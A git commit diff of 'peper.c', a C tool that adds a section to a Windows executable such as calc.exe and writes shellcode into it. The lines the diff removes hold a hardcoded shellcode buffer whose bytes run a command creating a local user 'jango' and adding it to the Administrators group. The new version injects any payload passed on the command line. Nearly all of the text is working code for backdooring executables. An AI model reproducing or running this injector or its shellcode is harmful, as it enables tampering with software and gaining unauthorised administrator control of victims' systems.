3755a8092167a4f09d73e52830ccff66dd712a76
zarat <manuel@zarat.ml>
2018-09-20 03:02:44 +0200

    Update and rename pepatcher.c to peper.c

--- peper.c
+++ peper.c
@@ -17,10 +17,9 @@ bool AddSection(char *filepath, char *sectionName, DWORD sizeOfSection) {
     BYTE *pByte = new BYTE[fileSize];
     DWORD dw;
     //lets read the entire file,so we can use the PE information
-    ReadFile(file, pByte, fileSize, &dw, NULL);
- 
+    ReadFile(file, pByte, fileSize, &dw, NULL); 
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false; //invalid PE
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE)  return false; //invalid PE
     PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
     PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER));
     PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
@@ -60,7 +59,7 @@ bool AddSection(char *filepath, char *sectionName, DWORD sizeOfSection) {
     return true;
 }
  
-bool AddCode(char *filepath) {
+bool AddCode(char *filepath, unsigned char *shellcode, int shellcode_len) {
     HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (file == INVALID_HANDLE_VALUE) return false;
     DWORD filesize = GetFileSize(file, NULL);
@@ -68,28 +67,39 @@ bool AddCode(char *filepath) {
     DWORD dw;
     ReadFile(file, pByte, filesize, &dw, NULL);
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
- 
-    //since we added a new section,it must be the last section added,cause of the code inside
-    //AddSection function,thus we must get to the last section to insert our secret data :)
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew); 
+    //since we added a new section,it must be the last section added so we must get to the last section to insert our secret data :)
     PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
-    PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);
- 
+    PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1); 
     SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
-    // example shellcode: add new user jango Jango01$
-    unsigned char buf[] =
-    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x6a\x61\x6e\x67\x6f\x20\x4a\x61\x6e\x67\x6f\x30\x31\x24\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x6a\x61\x6e\x67\x6f\x20\x2f\x41\x44\x44\x00";
-    WriteFile(file, buf, sizeof(buf), &dw, 0);
+    WriteFile(file, shellcode, shellcode_len, &dw, 0);
     CloseHandle(file);
     return TRUE;
 }
  
-int main() {
-    if (AddSection("C:\\Users\\manuel\\Desktop\\calc.exe", ".ATH", 400)){
-        printf("Section added!\n");
-        //Lets insert data into the last section
-        if (AddCode("C:\\Users\\manuel\\Desktop\\calc.exe")) printf("Code written!\n");
-        else printf("Error writting code!\n");
+int main( int argc, char *argv[] ) {
+    char *file, *section;
+    file = argv[1];
+    section = argv[2];    
+    int size;
+    size = atoi(argv[3]);       
+    // get the payload     
+    char *szStr;
+    szStr = argv[4];
+    unsigned char *lpData;
+    long nbytes;
+    char *lpszCopy;
+    /* Convert string to bytes (a) simply re-cast */
+    lpData = (unsigned char*)szStr;
+    nbytes = strlen(szStr);     
+    printf("[info] PEPatchER v 1.0 by Manuel Zarat (manuel.zarat@gmail.com)\n");     
+    if (AddSection(file, section, size)){
+        if (AddCode(file, lpData, nbytes)) {
+            printf("[info] %s Successfuly patched!\n", file);
+        } else {
+            printf("[erro] Error adding shellcode\n");
+        }
+    } else {
+        printf("[erro] Error adding Section\n");
     }
-    else  printf("Error adding section!\n");
 }
